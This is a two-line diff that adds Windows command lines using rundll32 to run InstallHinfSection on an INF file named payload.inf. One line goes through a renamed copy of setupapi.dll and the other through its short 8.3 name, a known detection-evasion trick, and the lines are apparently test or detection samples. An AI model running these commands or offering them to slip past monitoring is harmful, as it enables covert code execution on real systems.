@@ -1,0 +1,2 @@
+copy setupapi.dll alt_api.dll && rundll32.exe alt_api.dll,InstallHinfSection DefaultInstall 128 C:\temp\payload.inf
+rundll32.exe setupa~1.dll,InstallHinfSection DefaultInstall 128 C:\temp\payload.inf
